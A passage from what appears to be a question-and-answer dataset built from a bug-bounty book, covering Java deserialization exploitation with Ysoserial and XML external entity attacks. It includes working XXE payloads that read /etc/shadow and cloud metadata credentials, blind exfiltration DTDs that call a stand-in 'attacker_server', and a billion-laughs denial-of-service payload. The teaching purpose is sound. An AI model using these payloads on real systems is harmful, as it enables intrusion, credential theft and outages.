objects of any class.\nA potential attacker can achieve RCE by constructing objects of the right\nclasses that can lead to arbitrary commands.\nAchieving RCE\nThe path from a Java deserialization bug to RCE can be convoluted. To\ngain code execution, you often need to use a series of gadgets to reach\nthe desired method for code execution. This works similarly to exploiting\ndeserialization bugs using POP chains in PHP, so we won’t rehash the whole\nprocess here. In Java applications, you’ll find gadgets in the libraries loaded\nby the application. Using gadgets that are in the application’s scope, create\na chain of method invocations that eventually leads to RCE.\nFinding and chaining gadgets to formulate an exploit can be time-\nconsuming. You’re also limited to the classes available to the application,\nwhich can restrict what your exploits can do. To save time, try creating\nexploit chains by using gadgets in popular libraries, such as the Apache\nCommons-Collections, the Spring Framework, Apache Groovy, and\nApache Commons FileUpload. You’ll find many of these published online.\nAutomating the Exploitation by Using Ysoserial\nYsoserial (https://github.com/frohoff/ysoserial/) is a tool that you can use to\ngenerate payloads that exploit Java insecure deserialization bugs, saving you\ntons of time by keeping you from having to develop gadget chains yourself.\nYsoserial uses a collection of gadget chains discovered in common Java\nlibraries to formulate exploit objects. With Ysoserial, you can create mali-\ncious Java serialized objects that use gadget chains from specified libraries\nwith a single command:\n$ java -jar ysoserial.jar gadget_chain command_to_execute\nFor example, to create a payload that uses a gadget chain in the\nCommons-Collections library to open a calculator on the target host,\nexecute this command:\n$ java -jar ysoserial.jar CommonsCollections1 calc.exe\nThe gadget chains generated by Ysoserial all grant you the power to\nexecute commands on the system. The program takes the command you\nspecified and generates a serialized object that executes that command.\nSometimes the library to use for your gadget chain will seem obvious,\nbut often it’s a matter of trial and error, as you’ll have to discover which\nvulnerable libraries your target application implements. This is where good\nreconnaissance will help you.\nYou can find more resources about exploiting Java deserialization on\nGitHub at https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/.\nInsecure Deserialization 243\nPrevention\nDefending against deserialization vulnerabilities is difficult. The best way to\nprotect an application against these vulnerabilities varies greatly based on\nthe programming language, libraries, and serialization format used. No\none-size-fits-all solution exists.\nYou should make sure not to deserialize any data tainted by user input\nwithout proper checks. If deserialization is necessary, use an allowlist to\nrestrict deserialization to a small number of allowed classes.\nYou can also use simple data types, like strings and arrays, instead of\nobjects that need to be serialized when being transported. And, to pre-\nvent the tampering of serialized cookies, you can keep track of the session\nstate on the server instead of relying on user input for session information.\nFinally, you should keep an eye out for patches and make sure your depen-\ndencies are up-to-date to avoid introducing deserialization vulnerabilities\nvia third-party code.\nSome developers try to mitigate deserialization vulnerabilities by identi-\nfying the commonly vulnerable classes and removing them from the applica-\ntion. This effectively restricts available gadgets attackers can use in gadget\nchains. However, this isn’t a reliable form of protection. Limiting gadgets\ncan be a great layer of defense, but hackers are creative and can always find\nmore gadgets in other libraries, coming up with creative ways to achieve the\nsame results. It’s important to address the root cause of this vulnerability:\nthe fact that the application deserializes user data insecurely.\nThe OWASP Deserialization Cheat Sheet is an excellent resource for\nlearning how to prevent deserialization flaws for your specific technology:\nhttps://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html.\nHunting for Insecure Deserialization\nConducting a source code review is the most reliable way to detect deserial-\nization vulnerabilities. From the examples in this chapter, you can see that\nthe fastest way to find insecure deserialization vulnerabilities is by search-\ning for deserialization functions in source code and checking if user input\nis being passed into it recklessly. For example, in a PHP application, look for\nunserialize(), and in a Java application, look for readObject(). In Python and\nRuby applications, look for the functions pickle.loads() and Marshall.load(),\nrespectively.\nBut many bug bounty hunters have been able to find deserialization\nvulnerabilities without examining any code. Here are some strategies that\nyou can use to find insecure deserialization without access to source code.\nBegin by paying close attention to the large blobs of data passed into an\napplication. For example, the base64 string Tzo0OiJVc2VyIjoyOntzOjg6InVzZX\nJuYW1lIjtzOjY6InZpY2tpZSI7czo2OiJzdGF0dXMiO3M6OToibm90IGFkbWluIjt9 is the\nbase64-encoded version of the PHP serialized string O:4:\"User\":2:{s:8:\n\"username\";s:6:\"vickie\";s:6:\"status\";s:9:\"not admin\";}.\n244 Chapter 14\nAnd this is the base64 representation of a serialized Python object of\nclass Person with a name attribute of vickie: gASVLgAAAAAAAACMCF9fbWFpbl9\nflIwGUGVyc29ulJOUKYGUfZSMBG5hbWWUjAZWaWNraWWUc2Iu.\nThese large data blobs could be serialized objects that represent object\ninjection opportunities. If the data is encoded, try to decode it. Most encoded\ndata passed into web applications is encoded with base64. For example, as\nmentioned earlier, Java serialized objects often start with the hex characters\nAC ED 00 05 or the characters rO0 in base64. Pay attention to the Content-Type\nheader of an HTTP request or response as well. For example, a Content-Type\nset to application/x-java-serialized-object indicates that the application is\npassing information via Java serialized objects.\nAlternatively, you can start by seeking out features that are prone to\ndeserialization flaws. Look for features that might have to deserialize objects\nsupplied by the user, such as database inputs, authentication tokens, and\nHTML form parameters.\nOnce you’ve found a user-supplied serialized object, you need to deter-\nmine the type of serialized object it is. Is it a PHP object, a Python object,\na Ruby object, or a Java object? Read each programming language’s docu-\nmentation to familiarize yourself with the structure of its serialized objects.\nFinally, try tampering with the object by using one of the techniques\nI’ve mentioned. If the application uses the serialized object as an authen-\ntication mechanism, try to tamper with the fields to see if you can log in\nas someone else. You can also try to achieve RCE or SQL injection via a\ngadget chain.\nEscalating the Attack\nThis chapter has already described how insecure deserialization bugs often\nresult in remote code execution, granting the attacker a wide range of capa-\nbilities with which to impact the application. For that reason, deserializa-\ntion bugs are valuable and impactful vulnerabilities. Even when RCE isn’t\npossible, you might be able to achieve an authentication bypass or other-\nwise meddle with the logic flow of the application.\nHowever, the impact of insecure deserialization can be limited when\nthe vulnerability relies on an obscure point of entry, or requires a certain\nlevel of application privilege to exploit, or if the vulnerable function isn’t\navailable to unauthenticated users.\nWhen escalating deserialization flaws, take the scope and rules of\nthe bounty program into account. Deserialization vulnerabilities can be\ndangerous, so make sure you don’t cause damage to the target application\nwhen trying to manipulate program logic or execute arbitrary code. Read\nChapter 18 for tips on how to create safe PoCs for an RCE.\nInsecure Deserialization 245\nFinding Your First Insecure Deserialization!\nNow it’s time to dive in and find your first insecure deserialization vulner-\nability. Follow the steps we covered to find one:\n1. If you can get access to an application’s source code, search for deserial-\nization functions in source code that accept user input.\n2. If you cannot get access to source code, look for large blobs of data\npassed into an application. These could indicate serialized objects that\nare encoded.\n3. Alternatively, look for features that might have to deserialize objects\nsupplied by the user, such as database inputs, authentication tokens,\nand HTML form parameters.\n4. If the serialized object contains information about the identity of the\nuser, try tampering with the serialized object found and see if you can\nachieve authentication bypass.\n5. See if you can escalate the flaw into a SQL injection or remote code\nexecution. Be extra careful not to cause damage to your target applica-\ntion or server.\n6. Draft your first insecure deserialization report!\n246 Chapter 14",
    "question": "What is insecure deserialization and how can it be exploited in PHP and Java applications?",
    "summary": "Insecure deserialization occurs when applications deserialize user-supplied data without proper safeguards, allowing attackers to manipulate the data and alter program behavior. This vulnerability is common in PHP and Java, where attackers can exploit it to achieve remote code execution (RCE) or other security issues by manipulating serialized objects and their properties. Prevention involves careful handling of user input, using allowlists for deserialization, and keeping dependencies updated to avoid introducing vulnerabilities."
  },
  {
    "start": 167,
    "end": 178,
    "text": "15\nXML E X TERNAL ENTIT Y\nXML external entity attacks (XXEs) are fasci-\nnating vulnerabilities that target the XML\nparsers of an application. XXEs can be very\nimpactful bugs, as they can lead to confidential\ninformation disclosure, SSRFs, and DoS attacks. But\nthey are also difficult to understand and exploit.\nIn this chapter, we’ll dive into the ins and outs of XXEs so you can find\none in the wild. We will also talk about how to use XXEs to extract sensitive\nfiles on the target system, launch SSRFs, and trigger DoS attacks.\nMechanisms\nExtensible Markup Language (XML) is designed for storing and transporting\ndata. This markup language allows developers to define and represent arbi-\ntrary data structures in a text format using a tree-like structure like that of\nHTML. For example, web applications commonly use XML to transport\nidentity information in Security Assertion Markup Language (SAML)\nauthentication. The XML might look like this:\n<saml:AttributeStatement>\n<saml:Attribute Name=\"username\">\n<saml:AttributeValue>\nvickieli\n</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\nNotice here that unlike HTML, XML has user-defined tag names that\nlet you structure the XML document freely. The XML format is widely used\nin various functionalities of web applications, including authentication, file\ntransfers, and image uploads, or simply to transfer HTTP data from the cli-\nent to the server and back.\nXML documents can contain a document type definition (DTD), which\ndefines the structure of an XML document and the data it contains. These\nDTDs can be loaded from external sources or declared in the document\nitself within a DOCTYPE tag. For example, here is a DTD that defines an XML\nentity called file:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY file \"Hello!\">\n]>\n<example>&file;</example>\nXML entities work like variables in programming languages: any time\nyou reference this entity by using the syntax &file, the XML document will\nload the value of file in its place. In this case, any reference of &file within\nthe XML document will be replaced by \"Hello!\".\nXML documents can also use external entities to access either local or\nremote content with a URL. If an entity’s value is preceded by a SYSTEM key-\nword, the entity is an external entity, and its value will be loaded from the\nURL. You can see here that the following DTD declares an external entity\nnamed file, and the value of file is the contents of file:///example.txt on the\nlocal filesystem:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY file SYSTEM \"file:///example.txt\">\n]>\n<example>&file;</example>\nThat last line loads the file entity in the XML document, referencing\nthe contents of the text file located at file:///example.txt.\n248 Chapter 15\nExternal entities can also load resources from the internet. This DTD\ndeclares an external entity named file that points to the home page of\nexample.com:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY file SYSTEM \"http://example.com/index.html\">\n]>\n<example>&file;</example>\nWhat’s the vulnerability hidden within this functionality? The issue is\nthat if users can control the values of XML entities or external entities, they\nmight be able to disclose internal files, port-scan internal machines, or launch\nDoS attacks.\nMany sites use older or poorly configured XML parsers to read XML\ndocuments. If the parser allows user-defined DTDs or user input within\nthe DTD and is configured to parse and evaluate the DTD, attackers can\ndeclare their own external entities to achieve malicious results.\nFor example, let’s say a web application lets users upload their own\nXML document. The application will parse and display the document\nback to the user. A malicious user can upload a document like this one to\nread the /etc/shadow file on the server, which is where Unix systems store\nusernames and their encrypted passwords:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n1 <!ENTITY file SYSTEM \"file:///etc/shadow\">\n]>\n<example>&file;</example>\nParsing this XML file will cause the server to return the contents\nof /etc/shadow because the XML file includes /etc/shadow via an external\nentity 1.\nAttacks like these are called XML external entity attacks, or XXEs.\nApplications are vulnerable to XXEs when the application accepts user-\nsupplied XML input or passes user input into DTDs, which is then parsed\nby an XML parser, and that XML parser reads local system files or sends\ninternal or outbound requests specified in the DTD.\nPrevention\nPreventing XXEs is all about limiting the capabilities of an XML parser.\nFirst, because DTD processing is a requirement for XXE attacks, you should\ndisable DTD processing on the XML parsers if possible. If it’s not possible\nto disable DTDs completely, you can disable external entities, parameter\nentities (covered in “Escalating the Attack” on page 254), and inline DTDs\n(DTDs included in the XML document). And to prevent XXE-based DoS,\nyou can limit the XML parser’s parse time and parse depth. You can also\ndisable the expansion of entities entirely.\nXML External Entity 249\nThe mechanisms for disabling DTD processing and configuring parser\nbehavior vary based on the XML parser in use. For example, if you’re\nusing the default PHP XML parser, you need to set libxml_disable_entity\n_loader to TRUE to disable the use of external entities. For more information\non how to do it for your parser, consult the OWASP Cheat Sheet at https://\ngithub.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External\n_Entity_Prevention_Cheat_Sheet.md.\nAnother path you can take is input validation. You could create an\nallowlist for user-supplied values that are passed into XML documents, or\nsanitize potentially hostile data within XML documents, headers, or nodes.\nAlternatively, you can use less complex data formats like JSON instead of\nXML whenever possible.\nIn classic XXEs (like the example I showed in “Mechanisms” on\npage 249), attackers exfiltrate data by making the application return data\nin an HTTP response. If the server takes XML input but does not return\nthe XML document in an HTTP response, attackers can use blind XXEs\nto exfiltrate data instead. Blind XXEs steal data by having the target server\nmake an outbound request to the attacker’s server with the stolen data. To\nprevent blind XXEs, you can disallow outbound network traffic.\nFinally, you can routinely review your source code to detect and fix\nXXE vulnerabilities. And because many XXEs are introduced by an appli-\ncation’s dependencies instead of its custom source code, you should keep\nall dependencies in use by your application or by the underlying operating\nsystem up-to-date.\nHunting for XXEs\nTo find XXEs, start with locating the functionalities that are prone to them.\nThis includes anywhere that the application receives direct XML input, or\nreceives input that is inserted into XML documents that the application\nparses.\nStep 1: Find XML Data Entry Points\nMany applications use XML data to transfer information within HTTP mes-\nsages. To look for these endpoints, you can open up your proxy and browse\nthe target application. Then, find XML-like documents in HTTP messages\nby looking for the previously mentioned tree-like structures, or by looking\nfor the signature of an XML document: the string \"<?xml\".\nKeep an eye out for encoded XML data in the application as well.\nSometimes applications use base64- or URL-encoded XML data for ease\nof transportation. You can find these XML entry points by decoding any\nblocks of data that look suspicious. For example, a base64-encoded block\nof XML code tends to start with LD94bWw, which is the base64-encoded\nstring of \"<?xml\".\nBesides searching for XML within HTTP messages, you should also\nlook for file-upload features. This is because XML forms the basis of many\n250 Chapter 15\ncommon file types. If you can upload one of these file types, you might\nbe able to smuggle XML input to the application’s XML parser. XML can\nbe written into document and image formats like XML, HTML, DOCX,\nPPTX, XLSX, GPX, PDF, SVG, and RSS feeds. Furthermore, metadata\nembedded within images like GIF, PNG, and JPEG files are all based on\nXML. SOAP web services are also XML based. We’ll talk more about SOAP\nin Chapter 24.\nIn addition to looking for locations where the application accepts XML\ndata by default, you can try to force the application into parsing XML data.\nSometimes endpoints take plaintext or JSON input by default but can pro-\ncess XML input as well. On endpoints that take other formats of input, you\ncan modify the Content-Type header of your request to one of the following\nheaders:\nContent-Type: text/xml\nContent-Type: application/xml\nThen, try to include XML data in your request body. Sometimes this is\nall it takes to make the target application parse your XML input.\nFinally, some applications receive user-submitted data and embed it\ninto an XML document on the server side. If you suspect that is happening,\nyou can submit an XInclude test payload to the endpoint, which I introduce\nin step 5.\nStep 2: Test for Classic XXE\nOnce you’ve determined that the endpoints can be used to submit XML\ndata, you can start to test for the presence of functionalities needed for\nXXE attacks. This usually involves sending a few trial-and-error XXE pay-\nloads and observing the application’s response.\nIf the application is returning results from the parser, you might be\nable to carry out a classic XXE attack—that is, you can read the leaked files\ndirectly from the server’s response. To search for classic XXEs, first check\nwhether XML entities are interpreted by inserting XML entities into the\nXML input and see if it loads properly:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY test SYSTEM \"Hello!\">\n]>\n<example>&test;</example>\nThen, test whether the SYSTEM keyword is usable by trying to load a\nlocal file:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY test SYSTEM \"file:///etc/hostname\">\n]>\n<example>&test;</example>\nXML External Entity 251\nWhen the SYSTEM keyword does not work, you can replace it with the\nPUBLIC keyword instead. This tag requires you to supply an ID surrounded by\nquotes after the PUBLIC keyword. The parser uses this to generate an alternate\nURL for the value of the entity. For our purposes, you can just use a random\nstring in its place:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY test PUBLIC \"abc\" \"file:///etc/hostname\">\n]>\n<example>&test;</example>\nNext, try to extract some common system files. You can start with the files\n/etc/hostname and /etc/passwd, for example. Another file I like to extract using\nXXEs is .bash_history. This file is typically located at each user’s home direc-\ntory (~/.bash_history) and contains a list of commands previously executed. By\nreading this file, you can often uncover juicy information like internal URLs,\nIP addresses, and file locations. Common system files or paths mentioned\nhere can be restricted, so don’t give up if the first few files you try to read do\nnot display.\nStep 3: Test for Blind XXE\nIf the server takes XML input but does not return the XML document in an\nHTTP response, you can test for a blind XXE instead. Instead of reading\nfiles from the server’s response, most blind XXE attacks steal data by having\nthe target server make a request to the attacker’s server with the exfiltrated\ninformation.\nFirst, you need to make sure that the server can make outbound con-\nnections by having the target make a request to your server. You can set up\na callback listener by following the instructions in Chapter 13. The process\nfor setting up a listener to discover XXEs is the same as setting up to find\nSSRFs. Try making an external entity load a resource on your machine. To\nbypass common firewall restrictions, you should test with ports 80 and 443\nfirst, because the target’s firewall might not allow outbound connections on\nother ports:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY test SYSTEM \"http://attacker_server:80/xxe_test.txt\">\n]>\n<example>&test;</example>\nYou can then search the access logs of your server and look for a request\nto that particular file. In this case, you’ll be looking for a GET request for the\nxxe_test.txt file. Once you’ve confirmed that the server can make outbound\nrequests, you can try to exfiltrate files by using the techniques covered in\nupcoming sections.\n252 Chapter 15\nStep 4: Embed XXE Payloads in Different File Types\nBesides testing for XXEs on HTTP request bodies, you can try to upload\nfiles containing XXE payloads to the server. File-upload endpoints and file\nparsers are often not protected by the same XXE protection mechanisms\nas regular endpoints. And hiding your XXE payloads in different file types\nmeans that you will be able to upload your payloads even if the application\nrestricts the type of files that can be uploaded.\nThis section presents just a few examples of how to embed XXE pay-\nloads in various file types. You should be able to find more examples by\nsearching the internet.\nTo embed an XXE payload in an SVG image, you need to first open up\nthe image as a text file. Take this SVG image of a blue circle, for example:\n<svg width=\"500\" height=\"500\">\n<circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"blue\" />\n</svg>\nInsert the XXE payload by adding a DTD directly into the file and ref-\nerencing the external entity in the SVG image. You can then save the file as\nan .svg file and upload it to the server:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY test SYSTEM \"file:///etc/shadow\">\n]>\n<svg width=\"500\" height=\"500\">\n<circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"blue\" />\n<text font-size=\"16\" x=\"0\" y=\"16\">&test;</text>\n</svg>\nMicrosoft Word documents (.docx files), PowerPoint presentations\n(.pptx), and Excel worksheets (.xlxs) are archive files containing XML files,\nso you can insert XXE payloads into them as well. To do so, you should first\nunzip the document file. For example, I used the Unarchiver software on a\nMac to extract the files. You should see a few folders containing XML files\n(Figure 15-1).\nFigure 15-1: When you unarchive a DOCX file, you will see a few folders containing XML files.\nXML External Entity 253\nThen you can simply insert your payload into /word/document.xml,\n/ppt/presentation.xml, or /xl/workbook.xml. Finally, repack the archives into\nthe .docx, .pptx, or .xlxs format.\nYou can do this by cding into the unarchived folder and running the\ncommand zip -r filename.format *. The zip command line utility archives\nfiles. The -r option tells zip to recursively archive files in directories, filename\n.format tells zip what the name of the archived file should be, and * tells zip to\narchive all files in the current directory. In this case, you can run these com-\nmands to create a new DOCX file:\ncd example\nzip -r new_example.docx *\nYou should see the repacked document appear in the current directory.\nStep 5: Test for XInclude Attacks\nSometimes you cannot control the entire XML document or edit the DTD\nof an XML document. But you can still exploit an XXE vulnerability if the\ntarget application takes your user input and inserts it into XML documents\non the backend.\nIn this situation, you might be able to execute an XInclude attack instead.\nXInclude is a special XML feature that builds a separate XML document from\na single XML tag named xi:include. If you can control even a single piece of\nunsanitized data passed into an XML document, you might be able to place\nan XInclude attack within that value.\nTo test for XInclude attacks, insert the following payload into the\ndata entry point and see if the file that you requested gets sent back in the\nresponse body:\n<example xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<xi:include parse=\"text\" href=\"file:///etc/hostname\"/>\n</example>\nThis piece of XML code does two things. First, it references the http://\nwww.w3.org/2001/XInclude namespace so that we can use the xi:include ele-\nment. Next, it uses that element to parse and include the /etc/hostname file\nin the XML document.\nEscalating the Attack\nWhat you can achieve with an XXE vulnerability depends on the permissions\ngiven to the XML parser. Generally, you can use XXEs to access and exfiltrate\nsystem files, source code, and directory listings on the local machine. You can\nalso use XXEs to perform SSRF attacks to port-scan the target’s network, read\nfiles on the network, and access resources that are hidden behind a firewall.\nFinally, attackers sometimes use XXEs to launch DoS attacks.\n254 Chapter 15\nReading Files\nTo read local files by using an XXE vulnerability, place the local file’s path\ninto the DTD of the parsed XML file. Local files can be accessed by using\nthe file:// URL scheme followed by the file’s path on the machine. This pay-\nload will make the XML parser return the contents of the /etc/shadow file on\nthe server:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY file SYSTEM \"file:///etc/shadow\">\n]>\n<example>&file;</example>\nLaunching an SSRF\nBesides retrieving system files, you can use the XXE vulnerability to launch\nSSRF attacks against the local network. For example, you can launch a port\nscan by switching out the external entity’s URL with different ports on the\ntarget machine. This is similar to the port-scanning technique mentioned\nin Chapter 13, where you can determine the status of a port by analyzing\ndifferences in the server’s responses:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY file SYSTEM \"http://10.0.0.1:80\">\n]>\n<example>&file;</example>\nYou can also use an XXE to launch an SSRF to pull instance metadata,\nas we talked about in Chapter 13. This payload will make the parser return\nAWS metadata:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY file SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">\n]>\n<example>&file;</example>\nWhen trying to view unintended data like this, you should look for the\nexfiltrated data by inspecting the page source code (right-click the page\nand click View Source) or HTTP response directly, rather than viewing the\nHTML page rendered by the browser, because the browser might not ren-\nder the page correctly.\nOf course, what you can do with an XXE-based SSRF isn’t simply lim-\nited to network scanning and retrieving instance metadata. You can also\nuse the information you gathered to pivot into internal services. For more\nideas of how to exploit SSRFs, visit Chapter 13.\nXML External Entity 255\nUsing Blind XXEs\nSometimes the application does not return the results of XML parsing to\nthe user. In this case, you can still exfiltrate data to a server that you control\nby forcing the XML parser to make an external request with the desired\ndata in the request URL—the blind XXE attacks mentioned earlier. Then\nyou can monitor your server logs to retrieve the exfiltrated data. At this\npoint, you might think the payload of a blind XXE looks like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY file SYSTEM \"file:///etc/shadow\">\n<!ENTITY exfiltrate SYSTEM \"http://attacker_server/?&file\">\n]>\n<example>&exfiltrate;</example>\nThis payload is meant to exfiltrate the /etc/shadow file on the server\nby making a request to the attacker’s server with the file’s contents in a\nURL parameter. The payload first defines an external entity file that\ncontains the contents of the local /etc/shadow file. Then it makes a request\nto the attacker’s server with the contents of that file in the request’s URL\nparameter.\nHowever, this attack probably wouldn’t work, because most parsers do\nnot allow external entities to be included in other external entities. And\nparsers would stop processing the DTD once they encounter this line:\n<!ENTITY exfiltrate SYSTEM \"http://attacker_server/?&file\">. So exfiltrating\ndata by using a blind XXE is a bit more complicated than in a classic XXE.\nFortunately, XML DTDs have a feature called parameter entities that we\ncan use instead. Parameter entities are XML entities that can be referenced\nonly elsewhere within the DTD. They are declared and referenced with\na percent (%) character. For example, the blind XXE payload I introduced\nearlier can be rewritten as follows:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY % file SYSTEM \"file:///etc/shadow\"> 1\n<!ENTITY % ent \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>\"> 2\n%ent;\n%exfiltrate;\n]>\nThis DTD first declares a parameter entity called file that contains the\nfile contents of /etc/shadow 1. Then it declares a parameter entity named\nent that contains a dynamic declaration of another parameter entity called\nexfiltrate 2. &#x25; is the hex-encoded version of the percent sign (%).\nDepending on your target, hex encoding is sometimes needed for special\ncharacters within dynamic declarations. The exfiltrate entity points to the\nattacker’s server with the contents of /etc/shadow in the URL parameter.\n256 Chapter 15\nFinally, the DTD references ent to declare the exfiltrate entity and then ref-\nerences exfiltrate to trigger the outbound request.\nBut if you try to upload this payload to a target, you might notice that it\ndoes not work. This is because, according to XML specifications, parameter\nentities are treated differently in inline DTDs (DTDs within the XML docu-\nment specified within the DOCTYPE tag) and external DTDs (a separate DTD\nhosted elsewhere). Within inline DTDs, parameter entities cannot be refer-\nenced within markups, so this line wouldn’t work: <!ENTITY &#x25; exfiltrate\nSYSTEM 'http://attacker_server/?%file;'>, whereas in external DTDs, no such\nrestriction exists.\nTo exfiltrate data via a blind XXE, you have to overcome this restriction\nby hosting an external DTD on your server. Try hosting a file named xxe.dtd\non your server:\n<!ENTITY % file SYSTEM \"file:///etc/shadow\">\n<!ENTITY % ent \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>\">\n%ent;\n%exfiltrate;\nThen make the target parser interpret your DTD by specifying it within\na parameter entity and referencing that entity:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY % xxe SYSTEM \"http://attacker_server/xxe.dtd\">\n%xxe;\n]>\nThis way, the target server will parse the submitted XML file and notice\nthat a parameter entity is referencing an external file. Then the target server\nwill retrieve and parse that external DTD, so your payload will execute,\nand the target will send the exfiltrated data back to your server. Here, we\nare exfiltrating the contents of the file /etc/shadow as a URL parameter in a\nrequest to the attacker’s server.\nNotice that in this attack, we used only parameter entities and did not\nuse external entities at all! If the parser blocks external entities or limits the\nreferencing of entities to protect against XXE, you can use this technique\nas well. However, this strategy can exfiltrate only a single line of the target\nfile, because the newline character (\\n) within target files will interrupt the\noutbound URL and may even cause the HTTP request to fail.\nAn easier way to exfiltrate data via a blind XXE is by forcing the parser\nto return a descriptive error message. For example, you can induce a File\nNot Found error by referencing a nonexistent file as the value of an exter-\nnal entity. Your external DTD can be rewritten as follows:\n<!ENTITY % file SYSTEM \"file:///etc/shadow\">\n<!ENTITY % ent \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>\">\n%ent;\n%error;\nXML External Entity 257\nNotice that I included the contents of /etc/shadow in the URL parameter\nof the nonexistent filepath. Then you can submit the same payload to the\ntarget to trigger the attack:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY % xxe SYSTEM \"http://attacker_server/xxe.dtd\">\n%xxe;\n]>\nThis malicious DTD will cause the parser to deliver the desired file con-\ntents as a File Not Found error:\njava.io.FileNotFoundException: file:///nonexistent/FILE CONTENTS OF /etc/shadow\nPerforming Denial-of-Service Attacks\nAnother potential way that attackers can exploit XML vulnerabilities is to\nlaunch denial-of-service attacks, which disrupt the machine so that legiti-\nmate users cannot access its services. Note that you should never try this\non a live target! Testing for DoS on a live target can cause the organization\nfinancial loss and is usually against companies’ bug bounty policies:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ELEMENT example ANY>\n<!ENTITY lol \"lol\">\n<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<example>&lol9;</example>\nThis payload embeds entities within entities, causing the XML parser\nto recursively dereference entities to get to the root entity value lol. Each\nlol9 entity would be expanded into 10 lol8 values, and each of those would\nbecome 10 lol7s, and so on. Eventually, a single lol9 will be expanded into\none billion lols. This will overload the memory of the XML parser, poten-\ntially causing it to crash.\nThis attack method is also called a billion laughs attack or an XML bomb.\nThe example here is taken from Wikipedia, where you can read more about\nthe attack: https://en.wikipedia.org/wiki/Billion_laughs_attack. Interestingly,\nalthough this attack is often classified as an XXE attack, it does not involve\nthe use of any external entities!\n258 Chapter 15\nMore About Data Exfiltration Using XXEs\nXXE data exfiltration becomes more complicated if the parser is hardened\nagainst XXE attacks, and if you are trying to read files of specific formats.\nBut there are always more ways to bypass restrictions!\nSometimes you’ll want to exfiltrate files that contain XML special char-\nacters, such as angle brackets (<>), quotes (\" or '), and the ampersand (&).\nAccessing these files directly via an XXE would break the syntax of your DTD\nand interfere with the exfiltration. Thankfully, XML already has a feature\nthat deals with this issue. In an XML file, characters wrapped within CDATA\n(character data) tags are not seen as special characters. So, for instance, if\nyou’re exfiltrating an XML file, you can rewrite your malicious external DTD\nas follows:\n1 <!ENTITY % file SYSTEM \"file:///passwords.xml\">\n2 <!ENTITY % start \"<![CDATA[\">\n3 <!ENTITY % end \"]]>\">\n4 <!ENTITY % ent \"<!ENTITY &#x25; exfiltrate\n'http://attacker_server/?%start;%file;%end;'>\">\n%ent;\n%exfiltrate;\nThis DTD first declares a parameter entity that points to the file you\nwant to read 1. It also declares two parameter entities containing the strings\n\"<![CDATA[\" and \"]]>\" 2 3. Then it constructs an exfiltration URL that will\nnot break the DTD’s syntax by wrapping the file’s contents in a CDATA tag 4.\nThe concatenated exfiltrate entity declaration will become the following:\n<!ENTITY % exfiltrate 'http://attacker_server/?<![CDATA[CONTENTS_OF_THE_FILE]]>'>\nYou can see that our payloads are quickly getting complicated. To prevent\naccidentally introducing syntax errors to the payload, you can use a tool such\nas XmlLint (https://xmllint.com/) to ensure that your XML syntax is valid.\nFinally, send your usual XML payload to the target to execute the attack:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE example [\n<!ENTITY % xxe SYSTEM \"http://attacker_server/xxe.dtd\">\n%xxe;\n]>\nAnother way of exfiltrating files with special characters is to use a PHP\nURL wrapper. If the target is a PHP-based app, PHP wrappers let you con-\nvert the 